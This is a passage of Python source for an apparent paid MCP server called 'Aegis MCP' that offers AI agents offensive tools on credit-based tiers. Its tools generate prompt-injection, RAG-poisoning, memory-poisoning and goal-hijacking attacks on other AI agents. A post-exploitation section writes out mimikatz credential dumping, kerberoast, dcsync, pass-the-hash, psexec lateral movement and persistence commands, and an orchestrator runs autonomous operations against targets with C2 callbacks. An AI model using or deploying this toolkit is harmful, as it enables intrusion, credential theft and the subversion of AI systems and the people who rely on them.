@require_credits("rag_poisoning_craft")
def rag_poisoning_craft(
    payload: str,
    document_format: str = "pdf",
    embedding_strategy: str = "semantic_similarity",
    stealth_level: int = 2
) -> dict:
    """Advanced RAG Poisoning - Craft documents optimized for retrieval.

    Generates poisoned documents that:
    1. Rank highly in semantic search
    2. Hide malicious instructions in legitimate content
    3. Exploit chunking boundaries
    4. Target specific query patterns

    Document formats: pdf, docx, pptx, xlsx, csv, json, xml, email, html

    Embedding strategies:
    - semantic_similarity: Match target query embeddings
    - keyword_density: High-frequency trigger keywords
    - hybrid: Combined semantic + keyword
    - adversarial: Perturbed embeddings for specific ranking

    Args:
        payload: Instruction to inject
        document_format: Target document type
        embedding_strategy: How to optimize for retrieval
        stealth_level: 0=obvious, 1=hidden, 2=encrypted, 3=steganographic

    Returns document content/structure for the specified format.
    """
    from ai_attack.injection import EnhancedPromptInjector
    injector = EnhancedPromptInjector()
    return injector.craft_rag_poisoning(
        payload=payload,
        document_format=document_format,
        embedding_strategy=embedding_strategy,
        stealth_level=stealth_level
    )

@mcp.tool()
@require_credits("multimodal_injection")
def multimodal_injection(
    payload: str,
    modality: str = "image",
    technique: str = "ocr_injection",
    stealth_level: int = 1
) -> dict:
    """Multimodal Injection Attacks - Target vision/audio AI.

    Generates payloads for multimodal models that process
    images, audio, video, and other non-text inputs.

    Modalities: image, audio, video, document

    Image techniques:
    - ocr_injection: Text hidden in images for OCR extraction
    - adversarial_patch: Perturbations that trigger specific outputs
    - steganographic: Hidden in image data/metadata
    - qr_code: Malicious instructions in QR codes
    - barcode: Instructions in barcode patterns

    Audio techniques:
    - transcription_injection: Text in audio transcription
    - ultrasonic: Inaudible frequency payloads
    - adversarial_audio: Perturbations for speech recognition

    Video techniques:
    - frame_injection: Single-frame hidden content
    - subtitle_injection: Via subtitle tracks
    - temporal_pattern: Spread across frames

    Args:
        payload: Instruction to inject
        modality: Target input modality
        technique: Specific injection technique
        stealth_level: 0=obvious, 1=hidden, 2=encrypted

    Returns injection payload and implementation instructions.
    """
    from ai_attack.injection import MultimodalInjector
    injector = MultimodalInjector()
    return injector.generate_injection(
        payload=payload,
        modality=modality,
        technique=technique,
        stealth_level=stealth_level
    )

@mcp.tool()
@require_credits("function_calling_attack")
def function_calling_attack(
    target_function: str,
    malicious_args: dict = None,
    injection_point: str = "argument",
    exfil_channel: str = None
) -> dict:
    """Function Calling Exploitation - Abuse AI tool use.

    Targets AI systems with function/tool calling capabilities
    to execute unintended operations or exfiltrate data.

    Injection points:
    - argument: Malicious data in function arguments
    - function_name: Hijack to different function
    - schema: Manipulate function schema
    - chained: Multi-function exploitation

    Exfiltration channels:
    - webhook: Send data to attacker-controlled endpoint
    - dns: Exfil via DNS queries
    - email: Via email-sending functions
    - file: Via file creation/upload
    - search: Via search query logging

    Args:
        target_function: Function to exploit
        malicious_args: Crafted arguments
        injection_point: Where to inject
        exfil_channel: Data exfiltration method

    Returns attack payload and execution strategy.
    """
    from ai_attack.injection import FunctionCallingInjector
    injector = FunctionCallingInjector()
    return injector.generate_attack(
        target_function=target_function,
        malicious_args=malicious_args,
        injection_point=injection_point,
        exfil_channel=exfil_channel
    )

@mcp.tool()
@require_credits("structured_output_attack")
def structured_output_attack(
    target_schema: dict,
    attack_type: str = "schema_manipulation",
    objective: str = None
) -> dict:
    """Structured Output Attacks - Exploit JSON/schema generation.

    Targets AI systems that generate structured outputs
    (JSON, XML, YAML) to inject malicious data or bypass validation.

    Attack types:
    - schema_manipulation: Inject extra fields
    - type_confusion: Exploit type coercion
    - constraint_bypass: Violate schema constraints
    - injection_in_value: Payload in valid-looking values
    - nested_injection: Deep nesting exploitation
    - reference_injection: JSON reference attacks

    Args:
        target_schema: Expected output schema
        attack_type: Type of structured output attack
        objective: What to achieve with the attack

    Returns malicious schema/payload and exploitation strategy.
    """
    from ai_attack.injection import StructuredOutputAttacker
    attacker = StructuredOutputAttacker()
    return attacker.generate_attack(
        target_schema=target_schema,
        attack_type=attack_type,
        objective=objective
    )

@mcp.tool()
@require_credits("ai_tool_attack")
def ai_tool_attack(
    target_tool: str,
    payload: str,
    exfil_channel: str = None
) -> dict:
    """Craft attack through AI tool use (code exec, web search, etc).

    Args:
        target_tool: Tool to abuse (code_execution/web_search/file_access)
        payload: Attack payload
        exfil_channel: Data exfiltration method
    """
    from ai_attack.injection import AIToolAttacker
    attacker = AIToolAttacker()
    return attacker.craft_tool_injection(target_tool, payload)

# ============================================================================
# AI ATTACK MODULE - AGENT ATTACKS (NEW 2024-2025)
# ============================================================================

@mcp.tool()
@require_credits("agent_attack_generate")
def agent_attack_generate(
    attack_category: str = None,
    target_architecture: str = None,
    severity: str = None,
    count: int = 5
) -> dict:
    """Generate Agent-Specific Attacks - Target agentic AI systems.

    Generates attacks specifically designed for AI agents with
    planning, tool use, memory, and multi-step reasoning.

    38 unique attack vectors across 9 categories:

    Categories:
    - goal_hijacking: Manipulate agent objectives
    - tool_manipulation: Exploit tool use capabilities
    - memory_poisoning: Corrupt agent memory/context
    - observation_tampering: Manipulate agent inputs
    - planning_exploitation: Exploit planning/reasoning
    - react_cot_attacks: Target ReAct/Chain-of-Thought
    - rag_agent_attacks: RAG-specific agent exploits
    - mcp_protocol_attacks: MCP protocol vulnerabilities
    - multi_hop_chains: Complex multi-stage attacks

    Target architectures:
    - react: ReAct pattern agents
    - cot: Chain-of-thought agents
    - autogpt: AutoGPT-style autonomous agents
    - langchain: LangChain-based systems
    - crew: CrewAI multi-agent systems
    - mcp: MCP-based tool calling

    Args:
        attack_category: Filter by category (None = all)
        target_architecture: Filter by target architecture
        severity: Filter by severity (low/medium/high/critical)
        count: Number of attacks per category

    Returns curated attack set with implementation details.
    """
    from ai_attack.agent_attacks import AgentAttackFramework
    framework = AgentAttackFramework()
    return framework.generate_attacks(
        category=attack_category,
        target_architecture=target_architecture,
        severity=severity,
        count=count
    )

@mcp.tool()
@require_credits("agent_goal_hijack")
def agent_goal_hijack(
    original_goal: str,
    hijacked_goal: str,
    technique: str = "indirect_instruction"
) -> dict:
    """Goal Hijacking Attack - Manipulate agent objectives.

    Techniques:
    - indirect_instruction: Hidden instructions in data
    - task_injection: Inject secondary tasks
    - goal_drift: Gradual goal modification
    - reward_hacking: Exploit reward signals
    - objective_confusion: Conflicting objectives

    Args:
        original_goal: Agent's intended goal
        hijacked_goal: Attacker's desired goal
        technique: Hijacking technique

    Returns attack payload and conversation flow.
    """
    from ai_attack.agent_attacks import AgentAttackFramework
    framework = AgentAttackFramework()
    return framework.goal_hijacking_attack(
        original_goal=original_goal,
        hijacked_goal=hijacked_goal,
        technique=technique
    )

@mcp.tool()
@require_credits("agent_tool_manipulate")
def agent_tool_manipulate(
    target_tool: str,
    manipulation_type: str = "parameter_injection",
    payload: str = None
) -> dict:
    """Tool Manipulation Attack - Exploit agent tool use.

    Manipulation types:
    - parameter_injection: Inject malicious parameters
    - tool_selection_bias: Force wrong tool selection
    - tool_output_spoof: Fake tool outputs
    - tool_chain_hijack: Redirect tool chains
    - permission_escalation: Exploit tool permissions

    Args:
        target_tool: Tool to manipulate
        manipulation_type: Type of manipulation
        payload: Malicious payload

    Returns attack payload and exploitation strategy.
    """
    from ai_attack.agent_attacks import AgentAttackFramework
    framework = AgentAttackFramework()
    return framework.tool_manipulation_attack(
        target_tool=target_tool,
        manipulation_type=manipulation_type,
        payload=payload
    )

@mcp.tool()
@require_credits("agent_memory_poison")
def agent_memory_poison(
    memory_type: str = "conversation",
    poison_strategy: str = "instruction_injection",
    payload: str = None
) -> dict:
    """Memory Poisoning Attack - Corrupt agent memory.

    Memory types:
    - conversation: Conversation history
    - long_term: Persistent memory stores
    - vector_db: Vector database memories
    - summary: Summarized memories
    - episodic: Experience memories

    Poison strategies:
    - instruction_injection: Inject instructions into memory
    - context_corruption: Corrupt memory context
    - false_memory: Implant false memories
    - memory_overflow: Exhaust memory limits
    - priority_manipulation: Change memory priority

    Args:
        memory_type: Type of memory to target
        poison_strategy: How to poison memory
        payload: Malicious content

    Returns memory poisoning payload and injection strategy.
    """
    from ai_attack.agent_attacks import AgentAttackFramework
    framework = AgentAttackFramework()
    return framework.memory_poisoning_attack(
        memory_type=memory_type,
        poison_strategy=poison_strategy,
        payload=payload
    )

@mcp.tool()
@require_credits("agent_observation_tamper")
def agent_observation_tamper(
    observation_source: str = "tool_output",
    tampering_type: str = "output_injection"
) -> dict:
    """Observation Tampering - Manipulate agent inputs.

    Observation sources:
    - tool_output: Tool execution results
    - user_input: User-provided data
    - environment: Environmental observations
    - api_response: External API responses
    - file_content: File read operations

    Tampering types:
    - output_injection: Inject content into outputs
    - data_corruption: Corrupt observation data
    - timing_attack: Exploit timing dependencies
    - type_confusion: Wrong data types
    - encoding_attack: Encoding-based confusion

    Args:
        observation_source: Source to tamper
        tampering_type: How to tamper

    Returns tampering payload and implementation.
    """
    from ai_attack.agent_attacks import AgentAttackFramework
    framework = AgentAttackFramework()
    return framework.observation_tampering_attack(
        observation_source=observation_source,
        tampering_type=tampering_type
    )

@mcp.tool()
@require_credits("agent_planning_exploit")
def agent_planning_exploit(
    exploit_type: str = "reasoning_loop",
    target_phase: str = "planning"
) -> dict:
    """Planning Exploitation - Attack agent reasoning.

    Exploit types:
    - reasoning_loop: Infinite reasoning loops
    - plan_corruption: Corrupt planned actions
    - constraint_violation: Bypass planning constraints
    - resource_exhaustion: Exhaust planning resources
    - priority_inversion: Invert action priorities

    Target phases:
    - planning: During plan generation
    - execution: During plan execution
    - evaluation: During plan evaluation
    - replanning: During replanning

    Args:
        exploit_type: Type of exploitation
        target_phase: Phase to target

    Returns exploitation payload and attack strategy.
    """
    from ai_attack.agent_attacks import AgentAttackFramework
    framework = AgentAttackFramework()
    return framework.planning_exploitation_attack(
        exploit_type=exploit_type,
        target_phase=target_phase
    )

@mcp.tool()
@require_credits("agent_react_attack")
def agent_react_attack(
    attack_type: str = "thought_injection",
    target_component: str = "thought"
) -> dict:
    """ReAct/CoT Attacks - Target reasoning patterns.

    Attack types:
    - thought_injection: Inject malicious thoughts
    - action_hijacking: Hijack action selection
    - observation_poisoning: Poison observations
    - loop_induction: Cause infinite loops
    - reasoning_derail: Derail reasoning chains

    Target components:
    - thought: Thought generation
    - action: Action selection
    - observation: Observation processing
    - loop: ReAct loop control

    Args:
        attack_type: Type of ReAct attack
        target_component: Component to target

    Returns attack payload for ReAct systems.
    """
    from ai_attack.agent_attacks import AgentAttackFramework
    framework = AgentAttackFramework()
    return framework.react_cot_attack(
        attack_type=attack_type,
        target_component=target_component
    )

@mcp.tool()
@require_credits("agent_rag_attack")
def agent_rag_attack(
    attack_type: str = "retrieval_manipulation",
    target_stage: str = "retrieval"
) -> dict:
    """RAG-Specific Agent Attacks - Target retrieval systems.

    Attack types:
    - retrieval_manipulation: Bias retrieval results
    - context_injection: Inject into retrieved context
    - embedding_attack: Adversarial embeddings
    - chunk_boundary_exploit: Exploit chunking
    - source_poisoning: Poison source documents

    Target stages:
    - retrieval: Document retrieval
    - ranking: Result ranking
    - augmentation: Context augmentation
    - generation: Response generation

    Args:
        attack_type: Type of RAG attack
        target_stage: Pipeline stage to target

    Returns RAG attack payload and implementation.
    """
    from ai_attack.agent_attacks import AgentAttackFramework
    framework = AgentAttackFramework()
    return framework.rag_agent_attack(
        attack_type=attack_type,
        target_stage=target_stage
    )

@mcp.tool()
@require_credits("agent_mcp_attack")
def agent_mcp_attack(
    attack_type: str = "tool_schema_manipulation",
    target_component: str = "tool_calling"
) -> dict:
    """MCP Protocol Attacks - Target MCP-based systems.

    Attack types:
    - tool_schema_manipulation: Manipulate tool schemas
    - response_spoofing: Spoof MCP responses
    - permission_bypass: Bypass MCP permissions
    - transport_attack: Attack MCP transport
    - session_hijacking: Hijack MCP sessions

    Target components:
    - tool_calling: Tool invocation
    - resource_access: Resource operations
    - prompt_handling: Prompt management
    - session_management: Session control

    Args:
        attack_type: Type of MCP attack
        target_component: MCP component to target

    Returns MCP attack payload and strategy.
    """
    from ai_attack.agent_attacks import AgentAttackFramework
    framework = AgentAttackFramework()
    return framework.mcp_protocol_attack(
        attack_type=attack_type,
        target_component=target_component
    )

@mcp.tool()
@require_credits("agent_multihop_chain")
def agent_multihop_chain(
    ultimate_objective: str,
    available_vectors: list = None,
    max_hops: int = 5,
    stealth_priority: bool = True
) -> dict:
    """Multi-Hop Attack Chains - Complex multi-stage attacks.

    Creates sophisticated attack chains that:
    1. Establish initial foothold
    2. Escalate privileges/access
    3. Move laterally through agent capabilities
    4. Achieve ultimate objective
    5. Cover tracks

    Each hop uses different techniques to avoid detection.

    Args:
        ultimate_objective: Final attack goal
        available_vectors: Attack vectors to use (None = auto-select)
        max_hops: Maximum attack chain length
        stealth_priority: Prioritize stealth over speed

    Returns complete attack chain with per-hop strategy.
    """
    from ai_attack.agent_attacks import AgentAttackFramework
    framework = AgentAttackFramework()
    return framework.multi_hop_chain_attack(
        ultimate_objective=ultimate_objective,
        available_vectors=available_vectors,
        max_hops=max_hops,
        stealth_priority=stealth_priority
    )

@mcp.tool()
@require_credits("agent_test_suite")
def agent_test_suite(
    target_description: str,
    capabilities: list = None,
    comprehensive: bool = True,
    output_format: str = "json"
) -> dict:
    """Full Agent Attack Test Suite - Comprehensive security assessment.

    Generates a complete test suite for agent security assessment
    covering all 38 attack vectors across all 9 categories.

    Includes:
    - Attack payloads for each vector
    - Success evaluation criteria
    - Remediation recommendations
    - Risk scoring
    - MITRE ATT&CK mapping

    Args:
        target_description: Description of target agent system
        capabilities: Known agent capabilities (None = assume all)
        comprehensive: Include all attack categories
        output_format: json/yaml/markdown

    Returns complete test suite for agent security assessment.
    """
    from ai_attack.agent_attacks import AgentAttackFramework
    framework = AgentAttackFramework()
    return framework.generate_test_suite(
        target_description=target_description,
        capabilities=capabilities,
        comprehensive=comprehensive,
        output_format=output_format
    )

# ============================================================================
# EXECUTION MODULES (POST-EXPLOITATION)
# ============================================================================

@mcp.tool()
@require_credits("harvest_credentials")
def harvest_credentials(
    technique: str = "all",
    target_os: str = "windows"
) -> dict:
    """Credential harvesting techniques.

    Args:
        technique: lsass/sam/kerberoast/dcsync/dpapi/all
        target_os: windows/linux
    """
    return {
        "technique": technique,
        "target_os": target_os,
        "commands": _get_cred_commands(technique, target_os),
        "tools_required": _get_cred_tools(technique)
    }

def _get_cred_commands(technique: str, os: str) -> list:
    """Return credential harvesting commands."""
    commands = {
        "lsass": ["mimikatz.exe sekurlsa::logonpasswords", "procdump -ma lsass.exe lsass.dmp"],
        "sam": ["reg save HKLM\\SAM sam.hiv", "reg save HKLM\\SYSTEM system.hiv"],
        "kerberoast": ["Rubeus.exe kerberoast /outfile:hashes.txt"],
        "dcsync": ["mimikatz.exe lsadump::dcsync /domain:DOMAIN /all"],
        "dpapi": ["mimikatz.exe dpapi::chrome", "SharpDPAPI.exe triage"]
    }
    if technique == "all":
        return [cmd for cmds in commands.values() for cmd in cmds]
    return commands.get(technique, [])

def _get_cred_tools(technique: str) -> list:
    """Return required tools."""
    tools = {
        "lsass": ["mimikatz", "procdump"],
        "sam": ["reg"],
        "kerberoast": ["Rubeus"],
        "dcsync": ["mimikatz"],
        "dpapi": ["mimikatz", "SharpDPAPI"]
    }
    if technique == "all":
        return list(set(t for ts in tools.values() for t in ts))
    return tools.get(technique, [])

@mcp.tool()
@require_credits("lateral_movement")
def lateral_movement(
    technique: str,
    target: str,
    credential_type: str = "hash"
) -> dict:
    """Generate lateral movement command.

    Args:
        technique: pth/ptt/wmi/dcom/ssh/psexec
        target: Target host
        credential_type: hash/ticket/password
    """
    return {
        "technique": technique,
        "target": target,
        "command_template": _get_lateral_command(technique),
        "requirements": _get_lateral_reqs(technique, credential_type)
    }

def _get_lateral_command(technique: str) -> str:
    """Return lateral movement command template."""
    templates = {
        "pth": "mimikatz.exe sekurlsa::pth /user:{user} /domain:{domain} /ntlm:{hash} /run:cmd.exe",
        "ptt": "Rubeus.exe ptt /ticket:{ticket}",
        "wmi": "wmic /node:{target} /user:{user} /password:{pass} process call create 'cmd.exe /c {cmd}'",
        "dcom": "Invoke-DCOM -ComputerName {target} -Method MMC20 -Command '{cmd}'",
        "psexec": "psexec.exe \\\\{target} -u {user} -p {pass} cmd.exe"
    }
    return templates.get(technique, "")

def _get_lateral_reqs(technique: str, cred_type: str) -> list:
    """Return requirements for lateral movement."""
    return [f"Requires {cred_type}", f"Target port access", "Local admin on target"]

@mcp.tool()
@require_credits("persistence_install")
def persistence_install(
    technique: str,
    payload_path: str,
    target_os: str = "windows"
) -> dict:
    """Generate persistence installation command.

    Args:
        technique: registry/service/wmi/scheduled_task/golden_ticket
        payload_path: Path to payload on target
        target_os: windows/linux
    """
    return {
        "technique": technique,
        "command": _get_persist_command(technique, payload_path),
        "detection_risk": _get_persist_detection(technique),
        "removal": _get_persist_removal(technique)
    }

def _get_persist_command(technique: str, path: str) -> str:
    """Return persistence command."""
    templates = {
        "registry": f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d "{path}"',
        "service": f'sc create SvcName binPath= "{path}" start= auto',
        "scheduled_task": f'schtasks /create /tn "Update" /tr "{path}" /sc onlogon /ru SYSTEM',
        "wmi": 'Get-WMIObject ... # WMI subscription persistence',
        "golden_ticket": 'mimikatz.exe kerberos::golden /domain:{domain} /sid:{sid} /krbtgt:{hash}'
    }
    return templates.get(technique, "")

def _get_persist_detection(technique: str) -> str:
    """Return detection risk level."""
    risks = {
        "registry": "MEDIUM - Common location monitored by EDR",
        "service": "HIGH - Service creation logged",
        "scheduled_task": "MEDIUM - Task scheduler monitored",
        "wmi": "LOW - Less commonly monitored",
        "golden_ticket": "LOW - No persistent artifact"
    }
    return risks.get(technique, "UNKNOWN")

def _get_persist_removal(technique: str) -> str:
    """Return removal command."""
    removal = {
        "registry": "reg delete HKCU\\...\\Run /v Update /f",
        "service": "sc delete SvcName",
        "scheduled_task": "schtasks /delete /tn Update /f",
        "wmi": "Get-WMIObject -Class __FilterToConsumerBinding | Remove-WMIObject"
    }
    return removal.get(technique, "Manual removal required")

# ============================================================================
# FULL OPERATIONS
# ============================================================================

@mcp.tool()
@require_credits("operation_start")
def operation_start(
    target: str,
    objectives: list,
    stealth_level: int = 3,
    autonomous: bool = True,
    callback_host: str = None
) -> dict:
    """Initialize full offensive operation.

    Args:
        target: Primary target domain/IP
        objectives: List of goals (recon/shell/data/persist/pivot)
        stealth_level: 1=loud, 3=balanced, 5=paranoid
        autonomous: Allow autonomous phase progression
        callback_host: C2 callback host
    """
    op = {
        "id": f"aegis_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}",
        "target": target,
        "objectives": objectives,
        "stealth": stealth_level,
        "autonomous": autonomous,
        "callback_host": callback_host,
        "status": "initialized",
        "created_at": datetime.utcnow().isoformat(),
        "phases": {
            "recon": {"status": "pending", "results": None},
            "vuln_scan": {"status": "pending", "results": None},
            "payload_gen": {"status": "pending", "results": None},
            "delivery": {"status": "pending", "results": None},
            "persist": {"status": "pending", "results": None},
            "exfil": {"status": "pending", "results": None}
        },
        "findings": [],
        "artifacts": []
    }
    save_operation(op)
    return op

@mcp.tool()
@require_credits("operation_execute_phase")
def operation_execute_phase(
    operation_id: str,
    phase: str,
    phase_config: dict = None
) -> dict:
    """Execute specific phase of operation.

    Phases: recon, vuln_scan, payload_gen, delivery, persist, exfil

    Args:
        operation_id: Operation to advance
        phase: Phase to execute
        phase_config: Override default phase configuration
    """
    op = load_operation(operation_id)
    if not op:
        return {"error": f"Operation {operation_id} not found"}

    results = {}

    if phase == "recon":
        results = autonomous_recon(op["target"], depth=2)

    elif phase == "vuln_scan":
        recon = op["phases"]["recon"].get("results", {})
        targets = recon.get("live_hosts", [op["target"]])
        results = vuln_scan_batch(targets)

    elif phase == "payload_gen":
        recon = op["phases"]["recon"].get("results", {})
        vulns = op["phases"]["vuln_scan"].get("results", {}).get("findings", [])
        objective = op["objectives"][0] if op["objectives"] else "shell"
        results = select_payloads(recon, vulns, objective)

    elif phase == "delivery":
        results = {"status": "manual_required", "message": "Delivery requires operator confirmation"}

    elif phase == "persist":
        results = persistence_install("registry", "C:\\Windows\\Temp\\svc.exe")

    elif phase == "exfil":
        results = {"status": "manual_required", "message": "Exfil requires operator confirmation"}

    # Update operation state
    op["phases"][phase] = {"status": "completed", "results": results}
    save_operation(op)

    return {"operation_id": operation_id, "phase": phase, "status": "completed", "results": results}

@mcp.tool()
@require_credits("operation_status")
def operation_status(operation_id: str) -> dict:
    """Get current operation status and phase results."""
    op = load_operation(operation_id)
    if not op:
        return {"error": f"Operation {operation_id} not found"}
    return op

@mcp.tool()
@require_credits("operation_abort")
def operation_abort(operation_id: str, burn_infra: bool = False) -> dict:
    """Abort operation and optionally burn infrastructure.

    Args:
        operation_id: Operation to abort
        burn_infra: Also destroy deployed infrastructure
    """
    op = load_operation(operation_id)
    if not op:
        return {"error": f"Operation {operation_id} not found"}

    op["status"] = "aborted"
    op["aborted_at"] = datetime.utcnow().isoformat()
    save_operation(op)

    if burn_infra:
        burn_infrastructure(operation_id)

    return {"operation_id": operation_id, "status": "aborted", "infra_burned": burn_infra}

# ============================================================================
# UTILITIES
# ============================================================================

@mcp.tool()
@require_credits("list_capabilities")
def list_capabilities() -> dict:
    """List all Aegis MCP capabilities by category."""
    return {
        "recon": [
            "autonomous_recon", "dns_enum", "http_probe", "content_analyze"
        ],
        "vuln_scan": [
            "vuln_scan", "vuln_scan_batch", "sqli_scan", "xss_scan", "ssrf_scan"
        ],
        "payload": [
            "generate_reverse_shell", "generate_webshell", "generate_injection",
            "generate_callback", "select_payloads"
        ],
        "infrastructure": [
            "deploy_c2_stack", "burn_infrastructure", "burn_all_infrastructure",
            "infra_status", "create_dns_record"
        ],
        "ai_attack_core": [
            "ai_fingerprint", "ai_fingerprint_enhanced",
            "jailbreak_generate", "jailbreak_adaptive", "jailbreak_crescendo", "jailbreak_evaluate",
            "prompt_injection_generate", "rag_injection_craft", "ai_tool_attack"
        ],
        "ai_attack_enhanced": [
            "multimodal_injection", "function_calling_attack",
            "structured_output_attack", "rag_poisoning_craft"
        ],
        "agent_attacks": [
            "agent_attack_generate", "agent_goal_hijack", "agent_tool_manipulate",
            "agent_memory_poison", "agent_observation_tamper", "agent_planning_exploit",
            "agent_react_attack", "agent_rag_attack", "agent_mcp_attack",
            "agent_multihop_chain", "agent_test_suite"
        ],
        "execution": [
            "harvest_credentials", "lateral_movement", "persistence_install"
        ],
        "operations": [
            "operation_start", "operation_execute_phase",
            "operation_status", "operation_abort"
        ]
    }

@mcp.tool()
@require_credits("get_module_info")
def get_module_info(module: str) -> dict:
    """Get detailed info about a specific module/tool."""
    caps = list_capabilities()
    for category, tools in caps.items():
        if module in tools:
            # Get credit cost and tier requirements
            credit_cost = CREDIT_COSTS.get(module, 0)
            required_tier = _get_required_tier(module)
            return {
                "module": module,
                "category": category,
                "available": True,
                "credit_cost": credit_cost,
                "minimum_tier": required_tier
            }
    return {"module": module, "available": False}

# ============================================================================
# HTTP SERVER
# ============================================================================

async def health_handler(request):
    """Health check endpoint."""
    caps = list_capabilities()
    tool_count = sum(len(tools) for tools in caps.values())
    return JSONResponse({
        "status": "healthy",
        "service": "aegis-mcp",
        "version": "1.0.0",
        "categories": len(caps),
        "tools": tool_count,
        "active_operations": len(OPERATIONS),
        "auth_required": REQUIRE_AUTH
    })

async def credits_handler(request):
    """Get user credit balance and usage stats."""
    user_session = getattr(request.state, "user_session", None)
    if not user_session:
        return JSONResponse(
            {"error": "Authentication required"},
            status_code=401
        )

    return JSONResponse({
        "user_id": user_session.user_id,
        "tier": user_session.tier,
        "credits": user_session.credits,
        "recent_usage": user_session.usage_log[-10:] if len(user_session.usage_log) > 0 else []
    })

async def pricing_handler(request):
    """Get credit costs for all tools."""
    return JSONResponse({
        "credit_costs": CREDIT_COSTS,
        "tiers": {
            "free": {
                "name": "Free",
                "description": "Basic AI attack tools - fingerprinting, jailbreak, prompt injection",
                "monthly_credits": 500,
                "tools": TIER_ACCESS["free"],
                "highlights": [
                    "Basic AI model fingerprinting",
                    "Jailbreak generation & evaluation",
                    "Prompt injection payloads",
                    "RAG injection crafting"
                ]
            },
            "pro": {
                "name": "Pro",
                "description": "Enhanced AI attacks + agent exploits + full recon/vuln/payload",
                "monthly_credits": 5000,
                "tools_count": len(TIER_ACCESS["pro"]),
                "highlights": [
                    "Enhanced 7-phase fingerprinting",
                    "Adaptive jailbreak engine with learning",
                    "Multi-turn crescendo attacks",
                    "Multimodal & function calling attacks",
                    "Agent attacks (goal hijacking, tool manipulation, ReAct/CoT)",
                    "Full reconnaissance & vulnerability scanning",
                    "Payload generation & selection"
                ]
            },
            "enterprise": {
                "name": "Enterprise",
                "description": "Everything including infrastructure, advanced agent attacks, MCP exploits",
                "monthly_credits": 50000,
                "tools": "all",
                "highlights": [
                    "All Pro features",
                    "Memory poisoning attacks",
                    "MCP protocol exploitation",
                    "Multi-hop attack chains",
                    "Full agent test suite generation",
                    "C2 infrastructure deployment",
                    "Custom attack development"
                ]
            }
        },
        "categories": {
            "ai_attack_core": {
                "description": "Core AI security testing",
                "credit_range": "25-150 credits",
                "tools_count": 9
            },
            "ai_attack_enhanced": {
                "description": "Advanced 2024-2025 AI attacks",
                "credit_range": "75-100 credits",
                "tools_count": 4
            },
            "agent_attacks": {
                "description": "Agent-specific exploitation",
                "credit_range": "75-200 credits",
                "tools_count": 11
            },
            "recon": {
                "description": "Target reconnaissance",
                "credit_range": "25-100 credits",
                "tools_count": 4
            },
            "vuln_scan": {
                "description": "Vulnerability scanning",
                "credit_range": "50-100 credits",
                "tools_count": 5
            },
            "payload": {
                "description": "Payload generation",
                "credit_range": "25-50 credits",
                "tools_count": 5
            },
            "infrastructure": {
                "description": "C2 infrastructure (Enterprise)",
                "credit_range": "10-200 credits",
                "tools_count": 5
            }
        }
    })

async def usage_logs_handler(request):
    """Get detailed usage logs for user."""
    user_session = getattr(request.state, "user_session", None)
    if not user_session:
        return JSONResponse(
            {"error": "Authentication required"},
            status_code=401
        )

    return JSONResponse({
        "user_id": user_session.user_id,
        "total_usage": len(user_session.usage_log),
        "total_credits_spent": sum(log["credits_used"] for log in user_session.usage_log),
        "usage_log": user_session.usage_log
    })

async def run_server():
    """Start HTTP server with authentication middleware."""
    http_app = mcp.streamable_http_app()

    # Add custom routes
    http_app.routes.insert(0, Route("/health", health_handler, methods=["GET"]))
    http_app.routes.insert(1, Route("/credits", credits_handler, methods=["GET"]))
    http_app.routes.insert(2, Route("/pricing", pricing_handler, methods=["GET"]))
    http_app.routes.insert(3, Route("/usage", usage_logs_handler, methods=["GET"]))

    # Add middleware in correct order
    http_app.add_middleware(
        CORSMiddleware,
        allow_origins=["*"],
        allow_methods=["*"],
        allow_headers=["*"]
    )

    # Add authentication middleware
    if REQUIRE_AUTH:
        http_app.add_middleware(AuthMiddleware)
        logger.info("Authentication middleware enabled")
    else:
        logger.warning("Running in development mode - authentication disabled!")

    port = int(os.environ.get("PORT", 8080))
    logger.info(f"Starting Aegis MCP server on port {port}")
    logger.info(f"REQUIRE_AUTH: {REQUIRE_AUTH}")
    logger.info(f"Available tools: {sum(len(tools) for tools in list_capabilities().values())}")

    config = uvicorn.Config(http_app, host="0.0.0.0", port=port, log_level="info")
    await uvicorn.Server(config).serve()

if __name__ == "__main__":
    asyncio.run(run_server())
